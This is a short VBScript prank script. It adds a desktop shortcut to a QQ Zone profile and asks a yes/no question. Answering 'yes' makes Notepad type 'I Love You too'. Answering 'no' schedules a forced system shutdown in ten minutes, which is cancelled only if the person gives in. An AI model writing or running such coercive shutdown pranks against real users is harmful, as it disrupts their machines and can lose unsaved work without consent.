Set Seven = WScript.CreateObject("WScript.Shell")
strDesktop = Seven.SpecialFolders("AllUsersDesktop")
set oShellLink = Seven.CreateShortcut(strDesktop & "Seven.url")
oShellLink.TargetPath = "http://user.qzone.qq.com/869956472"
oShellLink.Save
Sub ak47
Set oShellLink=Nothing
seven.Run "notepad",3
WScript.Sleep 500
seven.SendKeys "I "
WScript.Sleep 500
seven.SendKeys "L"
WScript.Sleep 500
seven.SendKeys "o"
WScript.Sleep 500
seven.SendKeys "v"
WScript.Sleep 500
seven.SendKeys "e"
WScript.Sleep 500
seven.SendKeys " Y"
WScript.Sleep 500
seven.SendKeys "o"
WScript.Sleep 500
seven.SendKeys "u too "
End Sub
se_key = (MsgBox("?",4,"Seven_下午"&Time))
If se_key=6 Then
Call ak47
Else
seven.Run "shutdown.exe -s -t 600"
agn=(MsgBox ("?",52,"提示"))
If agn=6 Then
seven.Run "shutdown.exe -a"
MsgBox "OK"
WScript.Sleep 500
Call ak47
Else
MsgBox "那就等着关机吧",48,"heng heng"
End If
End If
